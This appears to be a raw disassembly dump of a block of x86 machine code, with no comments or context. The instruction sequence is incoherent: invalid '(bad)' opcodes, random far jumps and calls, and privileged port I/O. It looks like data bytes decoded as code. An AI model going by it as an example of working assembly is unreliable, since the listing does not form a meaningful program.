  423765:	and    eax,0x664f9c6f
  42376a:	adc    esp,DWORD PTR [edi-0x71]
  42376d:	sahf   
  42376e:	jmp    0x423708
  423770:	sar    DWORD PTR [edx],cl
  423772:	inc    ecx
  423773:	adc    al,0x62
  423775:	cmc    
  423776:	mov    al,0xe4
  423778:	(bad)
  42377b:	sub    esp,DWORD PTR [edx]
  42377d:	or     ch,BYTE PTR [esp+edi*2-0x6ea5eb28]
  423784:	into   
  423785:	scas   al,BYTE PTR es:[edi]
  423786:	push   esp
  423787:	mov    BYTE PTR [edi],al
  423789:	call   0x7cddbc4e
  42378e:	mov    ebx,0xfbb2d734
  423793:	rcl    DWORD PTR [eax+0x172c9d67],cl
  423799:	es addr16 xchg esi,eax
  42379c:	dec    ebp
  42379d:	jno    0x4237a8
  42379f:	enter  0xcbd9,0x1e
  4237a3:	adc    BYTE PTR [ebp+0xb3ecaae],al
  4237a9:	mov    BYTE PTR [ecx+0x2c],dh
  4237ac:	outs   dx,DWORD PTR ds:[esi]
  4237ad:	jo     0x4237a8
  4237af:	call   0x7ecdfda7
  4237b4:	test   BYTE PTR [edx+0x46f187c0],ah
  4237ba:	out    dx,al
  4237bb:	inc    edi
  4237bc:	sub    cl,BYTE PTR [edi+0x10549cfd]
  4237c2:	xchg   edi,eax
  4237c3:	jnp    0x423760
  4237c5:	test   al,0x80
  4237c7:	pop    esi
  4237c8:	in     eax,0x88
  4237ca:	in     al,dx
  4237cb:	adc    al,0x96
  4237cd:	sbb    edx,DWORD PTR [esi-0xb]
  4237d0:	or     BYTE PTR [edx+0x75a90d62],ah
  4237d6:	or     eax,0xa5e5806d
  4237db:	mov    ds:0xb8b861b7,al
  4237e0:	clc    
  4237e1:	aam    0x75
  4237e3:	lahf   
  4237e4:	xchg   edx,eax
  4237e5:	out    0x8f,al
  4237e7:	push   eax
  4237e8:	cmp    al,0xa0
  4237ea:	cmp    al,BYTE PTR [esi]
  4237ec:	or     al,0x76
  4237ee:	jmp    0xdc81178c
  4237f3:	mov    ebp,0x9e4b33ab
  4237f8:	pop    edx
  4237f9:	mul    DWORD PTR [edx*4+0x162b3ef9]
  423800:	rcr    ch,0xdc
  423803:	test   BYTE PTR [esi],ch
  423805:	or     bl,BYTE PTR [eax+eax*8+0x7a5c8c1]
  42380c:	aam    0x88
  42380e:	and    eax,0x91da3f85
  423814:	ins    DWORD PTR es:[edi],dx
  423815:	jmp    0xb33d30ff
  42381a:	scas   al,BYTE PTR es:[edi]
  42381b:	mov    bh,0x52
  42381d:	jmp    0x4636:0x4494bff3
  423824:	inc    edi
  423825:	and    ecx,eax
  423827:	shl    edi,1
  423829:	mov    edi,0xb308e7c1
  42382e:	loop   0x423888
  423830:	push   ebx
  423831:	push   esi
  423832:	sbb    DWORD PTR [eax+0x60c0d28b],esp
  423838:	les    esi,FWORD PTR [eax]
  42383a:	test   al,0x6
  42383c:	lahf   
  42383d:	nop
  42383e:	adc    ch,BYTE PTR [eax-0x3a2bb4a2]
  423844:	pop    ss
  423845:	and    cl,BYTE PTR [ebp-0x38]
  423848:	adc    al,0x12
  42384a:	mov    ebp,0xdb310b
  42384f:	mov    WORD PTR [ebx-0x1c83e8a4],ss
  423855:	nop
  423856:	or     al,0xd7
  423858:	out    dx,al
  423859:	pop    ebp
  42385a:	aas    
  42385b:	mov    esi,0x47478f07
  423860:	pop    ss
  423861:	xchg   ebx,eax
  423862:	mov    BYTE PTR [esi+0x61],dl
  423865:	fwait
  423866:	les    ebx,FWORD PTR [edi+0x51]
  423869:	and    DWORD PTR [eax+edx*2-0x2d],ecx
  42386d:	test   eax,0x40d06243
  423872:	push   ds
  423873:	outs   dx,BYTE PTR ds:[esi]
  423874:	sar    DWORD PTR [esi-0x236fca5f],1
  42387a:	jmp    0x4f11:0xbbe373f4
  423881:	jbe    0x4238f2
  423883:	and    eax,esi
  423885:	pop    esi
  423886:	sbb    eax,0x1b236cd0
  42388b:	gs or  al,dh
  42388e:	mov    ebp,DWORD PTR [ebx]
  423890:	push   ebp
  423891:	mov    edx,edi
  423893:	out    dx,eax
  423894:	adc    ecx,DWORD PTR [edx]
  423896:	adc    DWORD PTR [ebx+0x2b],edx
  423899:	push   ss
  42389a:	mov    dx,0x9f3
  42389e:	scas   al,BYTE PTR es:[edi]
  42389f:	add    DWORD PTR [ebx+0x495eea00],0x6628dce4
  4238a9:	jle    0x423914
  4238ab:	pushf  
  4238ac:	sbb    dh,BYTE PTR [eax-0x65]
  4238af:	pop    esi
  4238b0:	loop   0x423866
  4238b2:	fbstp  TBYTE PTR [edx]
  4238b4:	xor    esi,esi
  4238b6:	lahf   
  4238b7:	mov    eax,0x1c47def4
  4238bc:	popf   
  4238bd:	div    BYTE PTR [esi-0x12]
  4238c0:	dec    eax
  4238c1:	dec    esp
  4238c2:	jmp    0x1e9e:0xcdcb3c89
  4238c9:	dec    esi
  4238ca:	bound  esi,QWORD PTR ds:[edx+0x21]
  4238ce:	pop    es
  4238cf:	sbb    DWORD PTR [ecx-0x37e95d4],ecx
  4238d5:	jle    0x423858
  4238d7:	xor    BYTE PTR ds:0xa2ebb5c6,cl
  4238dd:	inc    edi
  4238de:	loopne 0x4238f6
  4238e0:	mov    DWORD PTR [ebx-0x10],ebx
  4238e3:	aam    0xe0
  4238e5:	sbb    ebp,edi
  4238e7:	jae    0x42393c
  4238e9:	jp     0x423899
  4238eb:	pop    ebp
  4238ec:	adc    BYTE PTR [edx+0x534a483b],cl
  4238f2:	mov    bh,0x37
  4238f4:	xchg   esp,eax
  4238f5:	iret   
  4238f6:	jno    0x423897
  4238f8:	jmp    0x9958:0xf7abf9ad
  4238ff:	sar    cl,cl
  423901:	dec    ecx
  423902:	sti    
  423903:	jl     0x42388d
  423905:	test   al,0x57
  423907:	mov    dh,0xec
  423909:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42390b:	mov    ds:0x8b29a032,eax
  423910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423911:	push   edx
  423912:	mov    dh,0xa4
  423914:	retf   0x5c45
  423917:	test   al,0x83
  423919:	stos   BYTE PTR es:[edi],al
  42391a:	inc    ebp
  42391b:	sbb    eax,0xedfb4f71
  423920:	sub    eax,DWORD PTR [ecx]
  423922:	add    DWORD PTR [ecx+0x1e38bd91],esp
  423928:	in     eax,dx
  423929:	and    DWORD PTR [edi+edx*1+0x41cb9039],0xfffffffa
  423931:	sub    edi,DWORD PTR [ebp-0x16465f3a]
  423937:	jo     0x4238d9
  423939:	outs   dx,DWORD PTR ds:[esi]
  42393a:	inc    ecx
  42393b:	jmp    0xd123:0xac1bd16e
  423942:	mov    bl,BYTE PTR [esi+edx*4+0x38]
  423946:	int3   
  423947:	fdiv   QWORD PTR [edi]
  423949:	cmp    bl,ch
  42394b:	or     al,0x5b
  42394d:	popf   
  42394e:	push   ecx
  42394f:	into   
  423950:	arpl   WORD PTR [ecx],sp
  423952:	aas    
  423953:	(bad)  
  423954:	ficom  WORD PTR [edi-0x25f18d2b]
  42395a:	mov    esp,0x4e60248e
  42395f:	mov    esp,0xf8480939
  423964:	and    eax,0x863cee1f
  423969:	call   0x9e81:0x3db62d5
  423970:	cmp    al,0x30
  423972:	fwait
  423973:	adc    eax,0x12182816
  423978:	ds and eax,0xe60af409
  42397e:	jns    0x4239a0
  423980:	xlat   BYTE PTR ds:[ebx]
  423981:	mov    esi,0xe6d786fb
  423986:	nop    ebx
  423989:	aad    0x49
  42398b:	xchg   DWORD PTR [ebp+0x6bdc1fe4],edx
  423991:	push   es
  423992:	fadd   DWORD PTR [edi+ebx*2]
  423995:	jge    0x423991
  423997:	sub    DWORD PTR [ebx+0x1f],ecx
  42399a:	jo     0x4239e6
  42399c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42399d:	iret   
  42399e:	ss je  0x42397b
  4239a1:	pop    esi
  4239a2:	mov    ebx,0x7d905a3
  4239a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239a8:	scas   al,BYTE PTR es:[edi]
  4239a9:	pop    esp
  4239aa:	dec    ecx
  4239ab:	mov    al,0x64
  4239ad:	lock xchg edi,eax
  4239af:	xchg   edx,eax
  4239b0:	jmp    0x3221:0x6d2d932
  4239b7:	fadd   DWORD PTR [ebx+edx*8+0x18]
  4239bb:	gs fwait
  4239bd:	in     eax,0x6
  4239bf:	pop    ebp
  4239c0:	aam    0xc
  4239c2:	jns    0x4239da
  4239c4:	push   0x16
  4239c6:	cmp    BYTE PTR [esi],dl
  4239c8:	repz dec esp
  4239ca:	ret    
  4239cb:	jmp    0x4239b7
  4239cd:	retf   
  4239ce:	push   0xc75c6211
  4239d3:	push   ecx
  4239d4:	push   esi
  4239d5:	push   0x8f27fbdb
  4239da:	repnz in al,0x22
  4239dd:	mov    dl,0xb4
  4239df:	sti    
  4239e0:	ins    DWORD PTR es:[edi],dx
  4239e1:	in     al,0xe3
  4239e3:	(bad)  
  4239e4:	pop    ss
  4239e5:	dec    ecx
  4239e6:	shr    BYTE PTR [ebx+esi*1+0x5a],1
  4239ea:	call   0x3c3a:0x72b18f4a
  4239f1:	das    
  4239f2:	or     dl,bh
  4239f4:	or     edx,esp
  4239f6:	aam    0xba
  4239f8:	mov    ebp,0x87decdb6
  4239fd:	adc    eax,DWORD PTR [eax]
  4239ff:	add    BYTE PTR [eax],al
  423a01:	add    BYTE PTR [esi-0x69],al
  423a04:	daa    
  423a05:	cmp    esi,edi
  423a07:	mov    ebx,0x9b53ff5e
  423a0c:	and    ebx,DWORD PTR [ebp+0x7aeac9cb]
  423a12:	pop    ebp
  423a13:	mov    bl,0x1
  423a15:	add    ah,dh
  423a17:	add    al,0x0
  423a19:	add    BYTE PTR [ebp+0x6fd01233],bh
  423a1f:	cmp    esp,ecx
  423a21:	stos   BYTE PTR es:[edi],al
  423a22:	or     BYTE PTR [ebx-0x51f7622f],0x52
  423a29:	sbb    DWORD PTR ds:0xaed14f3f,0xe7f95a6
  423a33:	dec    esi
  423a34:	rol    BYTE PTR [eax+eiz*4+0x24],cl
  423a38:	(bad)  [ebp+0x3a326d5d]
  423a3e:	imul   edi,DWORD PTR [edx],0xe75da455
  423a44:	inc    ecx
  423a45:	stc    
  423a46:	dec    ebx
  423a47:	sbb    BYTE PTR [edi+0x10],cl
  423a4a:	jl     0x423a47
  423a4c:	lds    ebx,FWORD PTR [esi+0x3684e637]
  423a52:	mov    DWORD PTR [edx],ebx
  423a54:	sub    eax,0x7b4343de
  423a59:	test   al,0x11
  423a5b:	dec    esi
  423a5c:	sbb    ebx,DWORD PTR [edx-0x7ce217cb]
  423a62:	cwde   
  423a63:	dec    edi
  423a64:	lods   al,BYTE PTR ds:[esi]
  423a65:	je     0x423a4b
  423a67:	push   esi
  423a68:	jmp    0x687a:0x626786ca
  423a6f:	call   0x329e7e20
  423a74:	int3   
  423a75:	sbb    edi,esi
  423a77:	pusha  
  423a78:	sahf   
  423a79:	not    ah
  423a7b:	push   esp
  423a7c:	icebp  
  423a7d:	das    
  423a7e:	push   ebp
  423a7f:	rcr    eax,cl
  423a81:	push   eax
  423a82:	(bad)  
  423a83:	ffree  st(3)
  423a85:	xor    DWORD PTR [ecx+0x4fcbb7ec],0xc8ad23c4
  423a8f:	jecxz  0x423ac0
  423a91:	cmp    BYTE PTR [ebx+0x2d],0xc5
  423a95:	scas   al,BYTE PTR es:[edi]
  423a96:	mov    dh,0x1e
  423a98:	inc    esi
  423a99:	lock sbb al,0xc8
  423a9c:	xor    DWORD PTR [ebx],esi
  423a9e:	dec    ecx
  423a9f:	sar    DWORD PTR [ebx+0x52b8b96f],0xb7
  423aa6:	idiv   DWORD PTR [edx-0x51b440b]
  423aac:	adc    eax,0x8fa6b307
  423ab1:	leave  
  423ab2:	ja     0x423af3
  423ab4:	xchg   ecx,ebx
  423ab6:	inc    esp
  423ab7:	dec    eax
  423ab8:	mov    eax,ds:0x108ec58e
  423abd:	mov    esi,0x7ea7681d
  423ac2:	xor    cl,BYTE PTR [edi-0x7c]
  423ac5:	and    edx,DWORD PTR [edx]
  423ac7:	cwde   
  423ac8:	(bad)  
  423ac9:	fisttp WORD PTR [ebp-0x5]
  423acc:	push   0x56c7cf3
  423ad1:	jp     0x423b2a
  423ad3:	jb     0x423a6b
  423ad5:	cwde   
  423ad6:	outs   dx,DWORD PTR ds:[esi]
  423ad7:	movhlps xmm2,xmm1
  423ada:	fmul   DWORD PTR [ebx+0x7b]
  423add:	sub    al,0xcd
  423adf:	and    eax,DWORD PTR [edi]
  423ae1:	mov    cl,dl
  423ae3:	sub    DWORD PTR [edx+0x48],edi
  423ae6:	cmc    
  423ae7:	stos   DWORD PTR es:[edi],eax
  423ae8:	repz cwde 
  423aea:	retf   
  423aeb:	(bad)  
  423aec:	aam    0x7b
  423aee:	and    eax,0xe3d460bb
  423af3:	aas    
  423af4:	dec    ebx
  423af5:	out    dx,al
  423af6:	mov    edx,0x11467d4d
  423afb:	iretw  
  423afd:	sub    dl,BYTE PTR [esi]
  423aff:	xor    DWORD PTR gs:[ebx],ebp
  423b02:	out    dx,eax
  423b03:	sahf   
  423b04:	lods   al,BYTE PTR ds:[esi]
  423b05:	mov    ecx,0x8247793e
  423b0a:	inc    ecx
  423b0b:	ja     0x423afd
  423b0d:	jl     0x423b80
  423b0f:	pop    ss
  423b10:	dec    ebx
  423b11:	in     al,dx
  423b12:	idiv   DWORD PTR [esi]
  423b14:	mov    edx,0x495774bf
  423b19:	or     edx,eax
  423b1b:	imul   esi,DWORD PTR [edi+0x345cbd25],0xd4a7fba8
  423b25:	jecxz  0x423b24
  423b27:	out    0x4e,eax
  423b29:	jp     0x423b62
  423b2b:	jge    0x423b70
  423b2d:	pusha  
  423b2e:	adc    esp,esp
  423b30:	je     0x423ae0
  423b32:	test   eax,0xff81c09a
  423b37:	call   0x11ea:0xe7f5d8dd
  423b3e:	xchg   BYTE PTR [ecx+0x9],dh
  423b41:	js     0x423b3d
  423b43:	mov    cl,0x34
  423b45:	xor    ah,BYTE PTR [ebp+0x21]
  423b48:	add    al,dh
  423b4a:	add    eax,0x4d4224d6
  423b4f:	jmp    0x423b8a
  423b51:	test   al,0x30
  423b53:	into   
  423b54:	std    
  423b55:	mov    cl,0x93
  423b57:	leave  
  423b58:	adc    al,0x80
  423b5a:	shr    ebx,1
  423b5c:	out    0xcd,al
  423b5e:	mov    al,0x22
  423b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b61:	pop    eax
  423b62:	or     ch,BYTE PTR [edi]
  423b64:	add    eax,0xe93ca043
  423b69:	mov    al,ds:0x83c7da34
  423b6e:	aad    0x55
  423b70:	mov    edi,0x1315abd4
  423b75:	pushf  
  423b76:	push   ebp
  423b77:	inc    ebx
  423b78:	inc    ecx
  423b79:	pusha  
  423b7a:	outs   dx,BYTE PTR ds:[esi]
  423b7b:	mov    ah,0x9e
  423b7d:	sub    al,0x75
  423b7f:	sbb    esi,DWORD PTR [ebp+0x16e9e41f]
  423b85:	push   ds
  423b86:	mov    bl,0x39
  423b88:	rcr    DWORD PTR [ecx-0x55d96a57],0xb8
  423b8f:	jo     0x423b2c
  423b91:	leave  
  423b92:	mov    ebx,DWORD PTR ds:0x7541f3d8
  423b98:	adc    BYTE PTR [ebp+0x63b9e60e],ah
  423b9e:	enter  0x36b0,0xf2
  423ba2:	in     al,dx
  423ba3:	pop    edi
  423ba4:	retf   0xdef9
  423ba7:	stos   DWORD PTR es:[edi],eax
  423ba8:	push   0x37075ee2
  423bad:	cdq    
  423bae:	push   0x39
  423bb0:	mov    ?,eax
  423bb2:	jp     0x423c28
  423bb4:	enter  0x20e5,0xbe
  423bb8:	or     ecx,DWORD PTR [eax+ebp*2+0x69b8434e]
  423bbf:	mov    al,ds:0xcd7fdf76
  423bc4:	aaa    
  423bc5:	jg     0x423bf6
  423bc7:	ins    DWORD PTR es:[edi],dx
  423bc8:	stos   BYTE PTR es:[edi],al
  423bc9:	inc    edx
  423bca:	sbb    eax,0x49333a07
  423bcf:	call   0x501d:0x8468bb54
  423bd6:	sbb    eax,0x4c614bf6
  423bdb:	push   eax
  423bdc:	cwde   
  423bdd:	rol    DWORD PTR [esi],cl
  423bdf:	pop    esi
  423be0:	into   
  423be1:	mov    dl,0x1e
  423be3:	and    edi,DWORD PTR [edx-0xda32ec3]
  423be9:	les    ebx,FWORD PTR [edx+0x486e748b]
  423bef:	call   0x4aa2a9c6
  423bf4:	iret   
  423bf5:	es fldpi 
  423bf8:	push   ebx
  423bf9:	or     BYTE PTR [ecx+0x777fb78],bl
  423bff:	nop
  423c00:	sbb    eax,0x62
  423c03:	clc    
  423c04:	jb     0x423c08
  423c06:	add    BYTE PTR ds:0xc472f44a,dl
  423c0c:	in     al,dx
  423c0d:	mov    dl,0x2
  423c0f:	cmp    BYTE PTR [ecx-0x75],ch
  423c12:	lock pop ebx
  423c14:	dec    ebx
  423c15:	in     al,dx
  423c16:	(bad)  
  423c17:	sbb    eax,0xea28528b
  423c1c:	(bad)  
  423c1d:	lock jmp 0xeffb:0x30b1c557
  423c25:	sbb    ebp,esi
  423c27:	cmp    ebp,DWORD PTR [eax]
  423c29:	fmul   st(7),st
  423c2b:	test   eax,0x462a83fb
  423c30:	or     eax,0x855da9ed
  423c35:	jecxz  0x423c8b
  423c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c38:	popa   
  423c39:	sar    ah,1
  423c3b:	inc    esp
  423c3c:	lods   eax,DWORD PTR ds:[esi]
  423c3d:	in     al,dx
  423c3e:	and    BYTE PTR [bp+di],ch
  423c41:	adc    DWORD PTR [ebx],ebp
  423c43:	les    esi,FWORD PTR [edi-0x6a]
  423c46:	cmp    eax,0x87eb222e
  423c4b:	dec    edx
  423c4c:	mov    ds:0xee5303d3,eax
  423c51:	jecxz  0x423cb2
  423c53:	scas   eax,DWORD PTR es:[edi]
  423c54:	fs aam 0x2f
  423c57:	scas   al,BYTE PTR es:[edi]
  423c58:	dec    ebx
  423c59:	fadd   QWORD PTR [ebp+0x4a586f37]
  423c5f:	adc    ah,0xa5
  423c62:	mov    eax,ds:0xfadc4d4d
  423c67:	jo     0x423c0e
  423c69:	ds leave 
  423c6b:	fnstsw WORD PTR [edx-0x19]
  423c6e:	dec    ecx
  423c6f:	(bad)  
  423c70:	xor    al,0x26
  423c72:	(bad)
  423c77:	leave  
  423c78:	add    cl,0x1e
  423c7b:	mov    ch,BYTE PTR [edx+esi*1+0xc0b47c9]
  423c82:	mov    bh,0x8d
  423c84:	sbb    eax,0xce2d8c80
  423c89:	sub    dh,dl
  423c8b:	jae    0x423c46
  423c8d:	sub    bl,cl
  423c8f:	shl    DWORD PTR [ebp-0x52f19e34],0x9d
  423c96:	push   esp
  423c97:	popa   
  423c98:	jp     0x423d09
  423c9a:	scas   al,BYTE PTR es:[edi]
  423c9b:	in     eax,0x24
  423c9d:	lahf   
  423c9e:	or     DWORD PTR [ebp+0x45],esi
  423ca1:	cmp    bh,cl
  423ca3:	out    0xfb,al
  423ca5:	sub    DWORD PTR [eax+eax*4-0x25],edx
  423ca9:	mov    eax,0x3305d51e
  423cae:	fwait
  423caf:	ins    DWORD PTR es:[edi],dx
  423cb0:	jb     0x423c7a
  423cb2:	adc    al,0x3e
  423cb4:	(bad)  
  423cb5:	ins    DWORD PTR es:[edi],dx
  423cb6:	clc    
  423cb7:	pop    ecx
  423cb8:	(bad)  
  423cb9:	jns    0x423d0d
  423cbb:	jb     0x423cba
  423cbd:	(bad)  
  423cbe:	sbb    eax,0xf60622ce
  423cc3:	fisubr WORD PTR [ecx+0x44]
  423cc6:	xchg   ecx,eax
  423cc7:	(bad)  [edx]
  423cc9:	test   al,0x71
  423ccb:	sbb    al,0x79
  423ccd:	lods   eax,DWORD PTR ds:[esi]
  423cce:	sub    ch,bl
  423cd0:	xchg   edi,eax
  423cd1:	dec    eax
  423cd2:	out    dx,al
  423cd3:	sbb    ecx,edx
  423cd5:	cli    
  423cd6:	inc    edx
  423cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cd8:	xchg   ecx,eax
  423cd9:	fs pop edi
  423cdb:	fcomp  st(5)
  423cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cde:	in     al,dx
  423cdf:	ror    BYTE PTR [edx-0x56],cl
  423ce2:	sub    edi,ebp
  423ce4:	fcmovnu st,st(6)
  423ce6:	das    
  423ce7:	(bad)  
  423ce8:	adc    edi,DWORD PTR [esi+eiz*2]
  423ceb:	or     DWORD PTR [ebp-0x7a5e5825],esp
  423cf1:	sti    
  423cf2:	xor    DWORD PTR [ebp+0x6cc4e30],esi
  423cf8:	jnp    0x423cff
  423cfa:	sbb    eax,0xddd5719
  423cff:	shr    ebx,1
  423d01:	loopne 0x423d3c
  423d03:	mov    dl,0x7e
  423d05:	fsubr  QWORD PTR [eax-0x1a]
  423d08:	ins    DWORD PTR es:[edi],dx
  423d09:	push   esi
  423d0a:	imul   DWORD PTR [esi+0x149aa61]
  423d10:	jne    0x423d86
  423d12:	in     eax,dx
  423d13:	sub    edi,edx
  423d15:	dec    esp
  423d16:	cmp    BYTE PTR [eax+0x69064d7d],ch
  423d1c:	xchg   esi,eax
  423d1d:	xor    BYTE PTR [esi],ch
  423d1f:	adc    BYTE PTR [ebx],ah
  423d21:	stc    
  423d22:	cmp    ebx,DWORD PTR [eax-0x3b950508]
  423d28:	(bad)  
  423d29:	js     0x423d58
  423d2b:	pop    ss
  423d2c:	shl    BYTE PTR [ebx+0x42],1
  423d2f:	retf   
  423d30:	inc    edi
  423d31:	sbb    bl,bh
  423d33:	mov    dh,0xa
  423d35:	fisub  DWORD PTR [esi]
  423d37:	outs   dx,BYTE PTR ds:[esi]
  423d38:	dec    edi
  423d39:	call   0x61b9:0x4e3d3179
  423d40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d41:	dec    ebp
  423d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d43:	dec    esp
  423d44:	scas   al,BYTE PTR es:[edi]
  423d45:	xchg   esp,eax
  423d46:	ret    0x8e5f
  423d49:	cld    
  423d4a:	push   cs
  423d4b:	popf   
  423d4c:	push   cs
  423d4d:	aas    
  423d4e:	xchg   edx,eax
  423d4f:	addr16 sub al,dl
  423d52:	test   esp,ebp
  423d54:	or     bl,BYTE PTR [edi+0x67d6c34]
  423d5a:	mov    ds:0x50c0c4e2,al
  423d5f:	clc    
  423d60:	es xchg ebx,eax
  423d62:	cmp    BYTE PTR [ecx],bl
  423d64:	pop    ebp
  423d65:	in     al,dx
  423d66:	cmp    edi,ebp
  423d68:	or     al,0x54
  423d6a:	repnz aad 0xca
  423d6d:	inc    ebp
  423d6e:	add    BYTE PTR [ecx],al
  423d70:	or     ah,BYTE PTR [ebx-0x3da0ad86]
  423d76:	mov    edi,0x56520d9a
  423d7b:	outs   dx,BYTE PTR ds:[esi]
  423d7c:	mov    ch,0x25
  423d7e:	adc    dh,ah
  423d80:	or     al,0x7b
  423d82:	mov    ds,WORD PTR [edi+edx*8-0x2d]
  423d86:	sbb    ah,BYTE PTR [ecx]
  423d88:	stc    
  423d89:	dec    edi
  423d8a:	clc    
  423d8b:	sub    edi,DWORD PTR [eax+0x313b9211]
  423d91:	adc    BYTE PTR [edi-0x4003261d],0xe4
  423d98:	mov    bh,0x47
  423d9a:	pop    edx
  423d9b:	rol    BYTE PTR [ecx],1
  423d9d:	retf   0x299d
  423da0:	lds    ebx,FWORD PTR [edi-0xb5e71cd]
  423da6:	fcomp  QWORD PTR [ecx]
  423da8:	and    edi,esp
  423daa:	stc    
  423dab:	mov    eax,0xc72993cf
  423db0:	pusha  
  423db1:	outs   dx,DWORD PTR ds:[esi]
  423db2:	clc    
  423db3:	pop    esp
  423db4:	mov    ah,0x1e
  423db6:	fmul   QWORD PTR [esi-0x7e]
  423db9:	in     al,dx
  423dba:	push   esi
  423dbb:	mov    BYTE PTR [esp+edx*4+0x1f90a804],bh
  423dc2:	sbb    bl,BYTE PTR [edx]
  423dc4:	in     al,dx
  423dc5:	xor    eax,0x7917ea8e
  423dca:	fld    DWORD PTR [esp+eiz*8-0x4c]
  423dce:	mov    edi,0x5cee41b6
  423dd3:	popf   
  423dd4:	rcl    BYTE PTR ds:0x94a2fcc,0x62
  423ddb:	mov    eax,0xb3ef3f48
  423de0:	imul   ebx,DWORD PTR [ebp+edx*4+0x77],0x8ae1902e
  423de8:	cdq    
  423de9:	xor    al,0xc9
  423deb:	inc    esp
  423dec:	(bad)  
  423ded:	ja     0x423e02
  423def:	mov    BYTE PTR [edi],ah
  423df1:	es cmc 
  423df3:	outs   dx,BYTE PTR ds:[esi]
  423df4:	cmp    al,0x5a
  423df6:	mov    eax,ds:0x85d9014f
  423dfb:	call   0x359c6387
  423e00:	int3   
  423e01:	or     al,0x33
  423e03:	fidiv  DWORD PTR [ecx+eiz*1-0x6d27e48b]
  423e0a:	mov    dl,bh
  423e0c:	mov    dl,0xcb
  423e0e:	ins    BYTE PTR es:[edi],dx
  423e0f:	or     DWORD PTR [esp+edx*4-0x6b],esp
  423e13:	cmp    BYTE PTR [ebp+0x38d2f140],ah
  423e19:	pop    edx
  423e1a:	xor    ebp,esi
  423e1c:	jo     0x423e43
  423e1e:	loop   0x423dff
  423e20:	inc    esp
  423e21:	jmp    0xd95d:0x30dafb6
  423e28:	fs push eax
  423e2a:	jb     0x423e1e
  423e2c:	jns    0x423e76
  423e2e:	push   esi
  423e2f:	fist   DWORD PTR [ebp+0x1f028b59]
  423e35:	jle    0x423dc7
  423e37:	and    eax,0x8f1b514d
  423e3c:	pop    edi
  423e3d:	sub    dl,BYTE PTR [ebx-0xe]
  423e40:	cwde   
  423e41:	test   eax,0xd13f8294
  423e46:	outs   dx,BYTE PTR ds:[esi]
  423e47:	xchg   edi,eax
  423e48:	hlt    
  423e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e4a:	aaa    
  423e4b:	icebp  
  423e4c:	lds    ecx,FWORD PTR [eax+eiz*8+0x2a975793]
  423e53:	push   0xacfa685
  423e58:	mov    cl,0xdc
  423e5a:	jno    0x423deb
  423e5c:	mov    ch,0xf6
  423e5e:	mov    edi,0xcab034e9
  423e63:	adc    BYTE PTR [ecx+ecx*4],ah
  423e66:	sub    al,0x35
  423e68:	pop    ds
  423e69:	cmp    bl,BYTE PTR [ebp-0x1e]
  423e6c:	(bad)  
  423e6d:	aas    
  423e6e:	mov    esi,DWORD PTR [ebx]
  423e70:	(bad)  
  423e71:	mov    ecx,?
  423e73:	jb     0x423ec2
  423e75:	mov    eax,0x1c03ebb7
  423e7a:	mov    BYTE PTR [eax+edx*1+0x5],bl
  423e7e:	mov    ds:0x1a6dd5ec,al
  423e83:	cmp    al,0x55
  423e85:	jnp    0x423eeb
  423e87:	sbb    ah,BYTE PTR [ebx-0x18565a62]
  423e8d:	aam    0xfa
  423e8f:	clc    
  423e90:	or     eax,0x90076d1b
  423e95:	mov    bl,0x5b
  423e97:	int3   
  423e98:	jg     0x423e46
  423e9a:	mov    ecx,0xf4e1ad91
  423e9f:	adc    al,0xfc
  423ea1:	in     eax,0x97
  423ea3:	test   al,0xc9
  423ea5:	test   BYTE PTR [ecx+eax*1+0x44b9db7e],0x47
  423ead:	cmp    ebx,DWORD PTR [esi-0x46]
  423eb0:	test   BYTE PTR [eax],dh
  423eb2:	fidiv  DWORD PTR ds:0x9f121b9f
  423eb8:	sti    
  423eb9:	mov    edi,ss
  423ebb:	xor    BYTE PTR [ecx+0x68],dl
  423ebe:	out    dx,eax
  423ebf:	add    al,0xd6
  423ec1:	cdq    
  423ec2:	mov    ds:0x5cdce9af,eax
  423ec7:	push   ecx
  423ec8:	push   ebx
  423ec9:	sub    ebx,DWORD PTR [edx+0x69fd1ed7]
  423ecf:	add    al,0xf1
  423ed1:	pop    ebp
  423ed2:	shl    DWORD PTR [ebx],cl
  423ed4:	or     ebx,ebx
  423ed6:	sahf   
  423ed7:	mov    eax,0x79e9fd13
  423edc:	xor    al,0xbf
  423ede:	push   esp
  423edf:	jae    0x423f1f
  423ee1:	adc    DWORD PTR [ebp+0x7e1e9aaf],edx
  423ee7:	stos   DWORD PTR es:[edi],eax
  423ee8:	test   DWORD PTR [edi],0x9dec1b3a
  423eee:	fisttp DWORD PTR [ebx]
  423ef0:	iret   
  423ef1:	sub    dh,ch
  423ef3:	sbb    DWORD PTR ds:0xb19d4969,ecx
  423ef9:	inc    eax
  423efa:	(bad)  
  423efb:	or     bl,BYTE PTR [eax+0x4fdc0f5b]
  423f01:	dec    ebp
  423f02:	stos   BYTE PTR es:[edi],al
  423f03:	cwde   
  423f04:	sti    
  423f05:	imul   ebp,DWORD PTR [esp+edx*1-0x6255a258],0xffffffc4
  423f0d:	imul   eax,DWORD PTR [eax],0xd2000000
  423f13:	clc    
  423f14:	data16 outs dx,BYTE PTR es:[esi]
  423f17:	mov    esi,0x8c85fcd2
  423f1c:	out    dx,al
  423f1d:	fisub  DWORD PTR [ebp-0x51]
  423f20:	dec    esp
  423f21:	rcl    DWORD PTR [ecx-0x48],0x1
  423f25:	add    ah,dh
  423f27:	add    al,0x0
  423f29:	add    ch,ch
  423f2b:	jno    0x423f4a
  423f2d:	stos   BYTE PTR es:[edi],al
  423f2e:	test   BYTE PTR [edx+0x6f],cl
  423f31:	outs   dx,DWORD PTR ds:[esi]
  423f32:	enter  0xd24d,0x2c
  423f36:	arpl   WORD PTR [ebx+ebp*4+0x3a09df5],bx
  423f3d:	lahf   
  423f3e:	or     al,0x56
  423f40:	fdiv   QWORD PTR [ebp-0x2c]
  423f43:	push   edx
  423f44:	out    0xe8,al
  423f46:	ss cmp al,0x43
